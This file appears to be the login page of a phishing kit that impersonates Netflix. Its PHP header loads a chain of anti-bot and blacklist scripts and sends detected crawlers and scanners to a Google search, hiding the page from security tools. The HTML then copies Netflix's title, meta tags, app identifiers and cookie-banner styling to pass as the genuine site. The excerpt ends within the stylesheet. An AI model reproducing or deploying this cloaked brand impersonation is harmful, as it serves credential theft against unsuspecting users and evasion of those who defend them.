<?php
session_start();
if($settings['session_only'] == "1"){
  if($_SESSION['email'] == "") {
    header('Location: back.php');
  } 
}

$settings = include('../../settings/settings.php');

# User Agent

$useragent = $_SERVER['HTTP_USER_AGENT'];

# Anti Bots 

include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
include("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

# Check User-Agents

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

$settings = include('../../settings/settings.php');

if($settings['print_match'] == "1"){
  echo $CrawlerDetect->getMatches();
}

if($CrawlerDetect->isCrawler($useragent)){
  header('Referer: '.$settings['referer']);
  header('Location: https://google.com/search?q='.$settings['out']);

} 


?>
<html data-triggered="true" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Netflix
    </title>

    <script type="text/javascript">function OptanonWrapper() {
      };
    </script>
    <meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies Germany, watch TV online, no download, full length movies" name="keywords">
    <meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link type="text/css" rel="stylesheet" href="assets/css/none.css" data-uia="botLink">
    <link type="text/css" rel="stylesheet" href="assets/css/implicity.css" data-uia="botLink">
    <link rel="shortcut icon" href="assets/img/icon.ico">
    <meta property="og:description" content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more.">
    <meta property="al:ios:app_store_id" content="363590051">
    <meta property="al:ios:app_name" content="Netflix">
    <meta property="al:android:app_name" content="Netflix">
    <meta name="twitter:card" content="player">
    <meta name="twitter:site" content="@netflix">
    <script src="assets/js/otBannerSdk.js" async="" type="text/javascript" crossorigin="anonymous">
    </script>
    <style type="text/css" id="onetrust-style">#onetrust-banner-sdk{
      -ms-text-size-adjust:100%;
      -webkit-text-size-adjust:100%}
      #onetrust-banner-sdk .onetrust-vendors-list-handler{
        cursor:pointer;
        color:#1f96db;
        font-size:inherit;
        font-weight:bold;
        text-decoration:none;
        margin-left:5px}
      #onetrust-banner-sdk .onetrust-vendors-list-handler:hover{
        color:#1f96db}
      #onetrust-banner-sdk .ot-close-icon,#onetrust-pc-sdk .ot-close-icon{
        background-image:url("data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMzQ4LjMzM3B4IiBoZWlnaHQ9IjM0OC4zMzNweCIgdmlld0JveD0iMCAwIDM0OC4zMzMgMzQ4LjMzNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzQ4LjMzMyAzNDguMzM0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZmlsbD0iIzU2NTY1NiIgZD0iTTMzNi41NTksNjguNjExTDIzMS4wMTYsMTc0LjE2NWwxMDUuNTQzLDEwNS41NDljMTUuNjk5LDE1LjcwNSwxNS42OTksNDEuMTQ1LDAsNTYuODVjLTcuODQ0LDcuODQ0LTE4LjEyOCwxMS43NjktMjguNDA3LDExLjc2OWMtMTAuMjk2LDAtMjAuNTgxLTMuOTE5LTI4LjQxOS0xMS43NjlMMTc0LjE2NywyMzEuMDAzTDY4LjYwOSwzMzYuNTYzYy03Ljg0Myw3Ljg0NC0xOC4xMjgsMTEuNzY5LTI4LjQxNiwxMS43NjljLTEwLjI4NSwwLTIwLjU2My0zLjkxOS0yOC40MTMtMTEuNzY5Yy0xNS42OTktMTUuNjk4LTE1LjY5OS00MS4xMzksMC01Ni44NWwxMDUuNTQtMTA1LjU0OUwxMS43NzQsNjguNjExYy0xNS42OTktMTUuNjk5LTE1LjY5OS00MS4xNDUsMC01Ni44NDRjMTUuNjk2LTE1LjY4Nyw0MS4xMjctMTUuNjg3LDU2LjgyOSwwbDEwNS41NjMsMTA1LjU1NEwyNzkuNzIxLDExLjc2N2MxNS43MDUtMTUuNjg3LDQxLjEzOS0xNS42ODcsNTYuODMyLDBDMzUyLjI1OCwyNy40NjYsMzUyLjI1OCw1Mi45MTIsMzM2LjU1OSw2OC42MTF6Ii8+PC9nPjwvc3ZnPg==");
        background-size:contain;
        background-repeat:no-repeat;
        background-position:center;
        height:12px;
        width:12px}
      #onetrust-banner-sdk .powered-by-logo,#onetrust-banner-sdk .ot-pc-footer-logo a,#onetrust-pc-sdk .powered-by-logo,#onetrust-pc-sdk .ot-pc-footer-logo a{
        background-size:contain;
        background-repeat:no-repeat;
        background-position:center;
        height:25px;
        width:152px;
        display:block}
      #onetrust-banner-sdk h3 *,#onetrust-banner-sdk h4 *,#onetrust-banner-sdk h6 *,#onetrust-banner-sdk button *,#onetrust-banner-sdk a[data-parent-id] *,#onetrust-pc-sdk h3 *,#onetrust-pc-sdk h4 *,#onetrust-pc-sdk h6 *,#onetrust-pc-sdk button *,#onetrust-pc-sdk a[data-parent-id] *{
        font-size:inherit;
        font-weight:inherit;
        color:inherit}
      #onetrust-banner-sdk .ot-hide,#onetrust-pc-sdk .ot-hide{
        display:none !important}
      #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column{
        padding:0}
      #onetrust-pc-sdk .ot-sdk-container{
        padding-right:0}
      #onetrust-pc-sdk .ot-sdk-row{
        flex-direction:initial;
        width:100%}
      #onetrust-pc-sdk [type="checkbox"]:checked,#onetrust-pc-sdk [type="checkbox"]:not(:checked){
        pointer-events:initial}
      #onetrust-pc-sdk [type="checkbox"]:disabled+label::before,#onetrust-pc-sdk [type="checkbox"]:disabled+label:after,#onetrust-pc-sdk [type="checkbox"]:disabled+label{
        pointer-events:none;
        opacity:0.7}
      #onetrust-pc-sdk #vendor-list-content{
        transform:translate3d(0, 0, 0)}
      #onetrust-pc-sdk li input[type="checkbox"]{
        z-index:1}
      #onetrust-pc-sdk li .ot-checkbox label{
        z-index:2}
      #onetrust-pc-sdk li .ot-checkbox input[type="checkbox"]{
        height:auto;
        width:auto}
      #onetrust-pc-sdk li .host-title a,#onetrust-pc-sdk li .ot-host-name a,#onetrust-pc-sdk li .accordion-text,#onetrust-pc-sdk li .ot-acc-txt{
        z-index:2;
        position:relative}
      #onetrust-pc-sdk input{
        margin:3px 0.1ex}
      #onetrust-pc-sdk .toggle-always-active{
        opacity:0.6;
        cursor:default}
      #onetrust-pc-sdk .screen-reader-only,#onetrust-pc-sdk .ot-scrn-rdr{
        border:0;
        clip:rect(0 0 0 0);
        height:1px;
        margin:-1px;
        overflow:hidden;
        padding:0;
        position:absolute;
        width:1px}
      #onetrust-pc-sdk .pc-logo,#onetrust-pc-sdk .ot-pc-logo{
        height:60px;
        width:180px;
        background-position:center;
        background-size:contain;
        background-repeat:no-repeat}
      #onetrust-pc-sdk .ot-tooltip .ot-tooltiptext{
        visibility:hidden;
        width:120px;
        background-color:#555;
        color:#fff;
        text-align:center;
        padding:5px 0;
        border-radius:6px;
        position:absolute;
        z-index:1;
        bottom:125%;
        left:50%;
        margin-left:-60px;
        opacity:0;
        transition:opacity 0.3s}
      #onetrust-pc-sdk .ot-tooltip .ot-tooltiptext::after{
        content:"";
        position:absolute;
        top:100%;
        left:50%;
        margin-left:-5px;
        border-width:5px;
        border-style:solid;
        border-color:#555 transparent transparent transparent}
      #onetrust-pc-sdk .ot-tooltip:hover .ot-tooltiptext{
        visibility:visible;
        opacity:1}
      #onetrust-pc-sdk .ot-tooltip{
        position:relative;
        display:inline-block;
        z-index:3}
      #onetrust-pc-sdk .ot-tooltip svg{
        color:grey;
        height:20px;
        width:20px}
      #onetrust-pc-sdk.ot-fade-in,.onetrust-pc-dark-filter.ot-fade-in{
        animation-name:onetrust-fade-in;
        animation-duration:400ms;
        animation-timing-function:ease-in-out}
      #onetrust-pc-sdk.ot-hide{
        display:none !important}
      .onetrust-pc-dark-filter.ot-hide{
        display:none !important}
      #ot-sdk-btn.ot-sdk-show-settings,#ot-sdk-btn.optanon-show-settings{
        color:#68b631;
        border:1px solid #68b631;
        height:auto;
        white-space:normal;
        word-wrap:break-word;
        padding:0.8em 2em;
        font-size:0.8em;
        line-height:1.2;
        cursor:pointer;
        -moz-transition:0.1s ease;
        -o-transition:0.1s ease;
        -webkit-transition:1s ease;
        transition:0.1s ease}
      #ot-sdk-btn.ot-sdk-show-settings:hover,#ot-sdk-btn.optanon-show-settings:hover{
        color:#fff;
        background-color:#68b631}
      #ot-sdk-btn.ot-sdk-show-settings:focus,#ot-sdk-btn.optanon-show-settings:focus{
        outline:none}
      .onetrust-pc-dark-filter{
        background:rgba(0,0,0,0.5);
        z-index:2147483646;
        width:100%;
        height:100%;
        overflow:hidden;
        position:fixed;
        top:0;
        bottom:0;
        left:0}
      @keyframes onetrust-fade-in{
        0%{
          opacity:0}
        100%{
          opacity:1}
      }
      @media only screen and (min-width: 426px) and (max-width: 896px) and (orientation: landscape){
        #onetrust-pc-sdk p{
          font-size:0.75em}
      }
      #onetrust-banner-sdk,#onetrust-pc-sdk,#ot-sdk-cookie-policy{
        font-size:16px}
      #onetrust-banner-sdk *,#onetrust-banner-sdk ::after,#onetrust-banner-sdk ::before,#onetrust-pc-sdk *,#onetrust-pc-sdk ::after,#onetrust-pc-sdk ::before,#ot-sdk-cookie-policy *,#ot-sdk-cookie-policy ::after,#ot-sdk-cookie-policy ::before{
        -webkit-box-sizing:content-box;
        -moz-box-sizing:content-box;
        box-sizing:content-box}
      #onetrust-banner-sdk div,#onetrust-banner-sdk span,#onetrust-banner-sdk h1,#onetrust-banner-sdk h2,#onetrust-banner-sdk h3,#onetrust-banner-sdk h4,#onetrust-banner-sdk h5,#onetrust-banner-sdk h6,#onetrust-banner-sdk p,#onetrust-banner-sdk img,#onetrust-banner-sdk svg,#onetrust-banner-sdk button,#onetrust-banner-sdk section,#onetrust-banner-sdk a,#onetrust-banner-sdk label,#onetrust-banner-sdk input,#onetrust-banner-sdk ul,#onetrust-banner-sdk li,#onetrust-banner-sdk nav,#onetrust-banner-sdk table,#onetrust-banner-sdk thead,#onetrust-banner-sdk tr,#onetrust-banner-sdk td,#onetrust-banner-sdk tbody,#onetrust-banner-sdk .ot-main-content,#onetrust-banner-sdk .ot-toggle,#onetrust-banner-sdk #ot-content,#onetrust-banner-sdk #ot-pc-content,#onetrust-banner-sdk .checkbox,#onetrust-pc-sdk div,#onetrust-pc-sdk span,#onetrust-pc-sdk h1,#onetrust-pc-sdk h2,#onetrust-pc-sdk h3,#onetrust-pc-sdk h4,#onetrust-pc-sdk h5,#onetrust-pc-sdk h6,#onetrust-pc-sdk p,#onetrust-pc-sdk img,#onetrust-pc-sdk svg,#onetrust-pc-sdk button,#onetrust-pc-sdk section,#onetrust-pc-sdk a,#onetrust-pc-sdk label,#onetrust-pc-sdk input,#onetrust-pc-sdk ul,#onetrust-pc-sdk li,#onetrust-pc-sdk nav,#onetrust-pc-sdk table,#onetrust-pc-sdk thead,#onetrust-pc-sdk tr,#onetrust-pc-sdk td,#onetrust-pc-sdk tbody,#onetrust-pc-sdk .ot-main-content,#onetrust-pc-sdk .ot-toggle,#onetrust-pc-sdk #ot-content,#onetrust-pc-sdk #ot-pc-content,#onetrust-pc-sdk .checkbox,#ot-sdk-cookie-policy div,#ot-sdk-cookie-policy span,#ot-sdk-cookie-policy h1,#ot-sdk-cookie-policy h2,#ot-sdk-cookie-policy h3,#ot-sdk-cookie-policy h4,#ot-sdk-cookie-policy h5,#ot-sdk-cookie-policy h6,#ot-sdk-cookie-policy p,#ot-sdk-cookie-policy img,#ot-sdk-cookie-policy svg,#ot-sdk-cookie-policy button,#ot-sdk-cookie-policy section,#ot-sdk-cookie-policy a,#ot-sdk-cookie-policy label,#ot-sdk-cookie-policy input,#ot-sdk-cookie-policy ul,#ot-sdk-cookie-policy li,#ot-sdk-cookie-policy nav,#ot-sdk-cookie-policy table,#ot-sdk-cookie-policy thead,#ot-sdk-cookie-policy tr,#ot-sdk-cookie-policy td,#ot-sdk-cookie-policy tbody,#ot-sdk-cookie-policy .ot-main-content,#ot-sdk-cookie-policy .ot-toggle,#ot-sdk-cookie-policy #ot-content,#ot-sdk-cookie-policy #ot-pc-content,#ot-sdk-cookie-policy .checkbox{
        font-family:inherit;
        font-size:initial;
        font-weight:normal;
        -webkit-font-smoothing:auto;
        letter-spacing:normal;
        line-height:normal;
        padding:0;
        margin:0;
        height:auto;
        min-height:0;
        max-height:none;
        width:auto;
        min-width:0;
        max-width:none;
        border-radius:0;
        border:none;
        clear:none;
        float:none;
        position:static;
        bottom:auto;
        left:auto;
        right:auto;
        top:auto;
        text-align:left;
        text-decoration:none;
        text-indent:0;
        text-shadow:none;
        text-transform:none;
        white-space:normal;
        background:none;
        overflow:visible;
        vertical-align:baseline;
        visibility:visible;
        z-index:auto;
        box-shadow:none}
      #onetrust-banner-sdk label:before,#onetrust-banner-sdk label:after,#onetrust-banner-sdk .checkbox:after,#onetrust-banner-sdk .checkbox:before,#onetrust-pc-sdk label:before,#onetrust-pc-sdk label:after,#onetrust-pc-sdk .checkbox:after,#onetrust-pc-sdk .checkbox:before,#ot-sdk-cookie-policy label:before,#ot-sdk-cookie-policy label:after,#ot-sdk-cookie-policy .checkbox:after,#ot-sdk-cookie-policy .checkbox:before{
        content:"";
        content:none}
      #onetrust-banner-sdk .ot-sdk-container,#onetrust-pc-sdk .ot-sdk-container,#ot-sdk-cookie-policy .ot-sdk-container{
        position:relative;
        width:100%;
        max-width:100%;
        margin:0 auto;
        padding:0 20px;
        box-sizing:border-box}
      #onetrust-banner-sdk .ot-sdk-column,#onetrust-banner-sdk .ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-column,#onetrust-pc-sdk .ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-columns{
        width:100%;
        float:left;
        box-sizing:border-box;
        padding:0;
        display:initial}
      @media (min-width: 400px){
        #onetrust-banner-sdk .ot-sdk-container,#onetrust-pc-sdk .ot-sdk-container,#ot-sdk-cookie-policy .ot-sdk-container{
          width:90%;
          padding:0}
      }
      @media (min-width: 550px){
        #onetrust-banner-sdk .ot-sdk-container,#onetrust-pc-sdk .ot-sdk-container,#ot-sdk-cookie-policy .ot-sdk-container{
          width:100%}
        #onetrust-banner-sdk .ot-sdk-column,#onetrust-banner-sdk .ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-column,#onetrust-pc-sdk .ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-columns{
          margin-left:4%}
        #onetrust-banner-sdk .ot-sdk-column:first-child,#onetrust-banner-sdk .ot-sdk-columns:first-child,#onetrust-pc-sdk .ot-sdk-column:first-child,#onetrust-pc-sdk .ot-sdk-columns:first-child,#ot-sdk-cookie-policy .ot-sdk-column:first-child,#ot-sdk-cookie-policy .ot-sdk-columns:first-child{
          margin-left:0}
        #onetrust-banner-sdk .ot-sdk-one.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-one.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-one.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-one.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-one.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-one.ot-sdk-columns{
          width:4.66666666667%}
        #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns{
          width:13.3333333333%}
        #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns{
          width:22%}
        #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns{
          width:30.6666666667%}
        #onetrust-banner-sdk .ot-sdk-five.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-five.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-five.ot-sdk-columns{
          width:39.3333333333%}
        #onetrust-banner-sdk .ot-sdk-six.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-six.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-six.ot-sdk-columns{
          width:48%}
        #onetrust-banner-sdk .ot-sdk-seven.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-seven.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-seven.ot-sdk-columns{
          width:56.6666666667%}
        #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns{
          width:65.3333333333%}
        #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns{
          width:74%}
        #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns{
          width:82.6666666667%}
        #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns{
          width:91.3333333333%}
        #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns{
          width:100%;
          margin-left:0}
        #onetrust-banner-sdk .ot-sdk-one-third.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-one-third.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-one-third.ot-sdk-column{
          width:30.6666666667%}
        #onetrust-banner-sdk .ot-sdk-two-thirds.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-two-thirds.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-two-thirds.ot-sdk-column{
          width:65.3333333333%}
        #onetrust-banner-sdk .ot-sdk-one-half.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-one-half.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-one-half.ot-sdk-column{
          width:48%}
        #onetrust-banner-sdk .ot-sdk-offset-by-one.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-one.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-one.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-one.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-one.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-one.ot-sdk-columns{
          margin-left:8.66666666667%}
        #onetrust-banner-sdk .ot-sdk-offset-by-two.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-two.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-two.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-two.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-two.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-two.ot-sdk-columns{
          margin-left:17.3333333333%}
        #onetrust-banner-sdk .ot-sdk-offset-by-three.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-three.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-three.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-three.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-three.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-three.ot-sdk-columns{
          margin-left:26%}
        #onetrust-banner-sdk .ot-sdk-offset-by-four.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-four.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-four.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-four.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-four.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-four.ot-sdk-columns{
          margin-left:34.6666666667%}
        #onetrust-banner-sdk .ot-sdk-offset-by-five.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-five.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-five.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-five.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-five.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-five.ot-sdk-columns{
          margin-left:43.3333333333%}
        #onetrust-banner-sdk .ot-sdk-offset-by-six.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-six.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-six.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-six.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-six.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-six.ot-sdk-columns{
          margin-left:52%}
        #onetrust-banner-sdk .ot-sdk-offset-by-seven.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-seven.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-seven.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-seven.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-seven.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-seven.ot-sdk-columns{
          margin-left:60.6666666667%}
        #onetrust-banner-sdk .ot-sdk-offset-by-eight.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-eight.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-eight.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-eight.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-eight.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-eight.ot-sdk-columns{
          margin-left:69.3333333333%}
        #onetrust-banner-sdk .ot-sdk-offset-by-nine.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-nine.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-nine.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-nine.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-nine.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-nine.ot-sdk-columns{
          margin-left:78%}
        #onetrust-banner-sdk .ot-sdk-offset-by-ten.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-ten.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-ten.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-ten.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-ten.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-ten.ot-sdk-columns{
          margin-left:86.6666666667%}
        #onetrust-banner-sdk .ot-sdk-offset-by-eleven.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-eleven.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-eleven.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-eleven.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-eleven.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-eleven.ot-sdk-columns{
          margin-left:95.3333333333%}
        #onetrust-banner-sdk .ot-sdk-offset-by-one-third.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-one-third.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-one-third.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-one-third.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-one-third.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-one-third.ot-sdk-columns{
          margin-left:34.6666666667%}
        #onetrust-banner-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-two-thirds.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-two-thirds.ot-sdk-columns{
          margin-left:69.3333333333%}
        #onetrust-banner-sdk .ot-sdk-offset-by-one-half.ot-sdk-column,#onetrust-banner-sdk .ot-sdk-offset-by-one-half.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-offset-by-one-half.ot-sdk-column,#onetrust-pc-sdk .ot-sdk-offset-by-one-half.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-offset-by-one-half.ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-offset-by-one-half.ot-sdk-columns{
          margin-left:52%}
      }
      #onetrust-banner-sdk h1,#onetrust-banner-sdk h2,#onetrust-banner-sdk h3,#onetrust-banner-sdk h4,#onetrust-banner-sdk h5,#onetrust-banner-sdk h6,#onetrust-pc-sdk h1,#onetrust-pc-sdk h2,#onetrust-pc-sdk h3,#onetrust-pc-sdk h4,#onetrust-pc-sdk h5,#onetrust-pc-sdk h6,#ot-sdk-cookie-policy h1,#ot-sdk-cookie-policy h2,#ot-sdk-cookie-policy h3,#ot-sdk-cookie-policy h4,#ot-sdk-cookie-policy h5,#ot-sdk-cookie-policy h6{
        margin-top:0;
        font-weight:600;
        font-family:inherit}
      #onetrust-banner-sdk h1,#onetrust-pc-sdk h1,#ot-sdk-cookie-policy h1{
        font-size:1.5rem;
        line-height:1.2}
      #onetrust-banner-sdk h2,#onetrust-pc-sdk h2,#ot-sdk-cookie-policy h2{
        font-size:1.5rem;
        line-height:1.25}
      #onetrust-banner-sdk h3,#onetrust-pc-sdk h3,#ot-sdk-cookie-policy h3{
        font-size:1.5rem;
        line-height:1.3}
      #onetrust-banner-sdk h4,#onetrust-pc-sdk h4,#ot-sdk-cookie-policy h4{
        font-size:1.5rem;
        line-height:1.35}
      #onetrust-banner-sdk h5,#onetrust-pc-sdk h5,#ot-sdk-cookie-policy h5{
        font-size:1.5rem;
        line-height:1.5}
      #onetrust-banner-sdk h6,#onetrust-pc-sdk h6,#ot-sdk-cookie-policy h6{
        font-size:1.5rem;
        line-height:1.6}
      @media (min-width: 550px){
        #onetrust-banner-sdk h1,#onetrust-pc-sdk h1,#ot-sdk-cookie-policy h1{
          font-size:1.5rem}
        #onetrust-banner-sdk h2,#onetrust-pc-sdk h2,#ot-sdk-cookie-policy h2{
          font-size:1.5rem}
        #onetrust-banner-sdk h3,#onetrust-pc-sdk h3,#ot-sdk-cookie-policy h3{
          font-size:1.5rem}
        #onetrust-banner-sdk h4,#onetrust-pc-sdk h4,#ot-sdk-cookie-policy h4{
          font-size:1.5rem}
        #onetrust-banner-sdk h5,#onetrust-pc-sdk h5,#ot-sdk-cookie-policy h5{
          font-size:1.5rem}
        #onetrust-banner-sdk h6,#onetrust-pc-sdk h6,#ot-sdk-cookie-policy h6{
          font-size:1.5rem}
      }
      #onetrust-banner-sdk p,#onetrust-pc-sdk p,#ot-sdk-cookie-policy p{
        margin:0 0 1em 0;
        font-family:inherit;
        line-height:normal}
      #onetrust-banner-sdk a,#onetrust-pc-sdk a,#ot-sdk-cookie-policy a{
        color:#565656;
        text-decoration:underline}
      #onetrust-banner-sdk a:hover,#onetrust-pc-sdk a:hover,#ot-sdk-cookie-policy a:hover{
        color:#565656;
        text-decoration:none}
      #onetrust-banner-sdk .ot-sdk-button,#onetrust-banner-sdk button,#onetrust-pc-sdk .ot-sdk-button,#onetrust-pc-sdk button,#ot-sdk-cookie-policy .ot-sdk-button,#ot-sdk-cookie-policy button{
        margin-bottom:1rem;
        font-family:inherit}
      #onetrust-banner-sdk .ot-sdk-button,#onetrust-banner-sdk button,#onetrust-banner-sdk input[type="submit"],#onetrust-banner-sdk input[type="reset"],#onetrust-banner-sdk input[type="button"],#onetrust-pc-sdk .ot-sdk-button,#onetrust-pc-sdk button,#onetrust-pc-sdk input[type="submit"],#onetrust-pc-sdk input[type="reset"],#onetrust-pc-sdk input[type="button"],#ot-sdk-cookie-policy .ot-sdk-button,#ot-sdk-cookie-policy button,#ot-sdk-cookie-policy input[type="submit"],#ot-sdk-cookie-policy input[type="reset"],#ot-sdk-cookie-policy input[type="button"]{
        display:inline-block;
        height:38px;
        padding:0 30px;
        color:#555;
        text-align:center;
        font-size:0.9em;
        font-weight:400;
        line-height:38px;
        letter-spacing:0.01em;
        text-decoration:none;
        white-space:nowrap;
        background-color:transparent;
        border-radius:2px;
        border:1px solid #bbb;
        cursor:pointer;
        box-sizing:border-box}
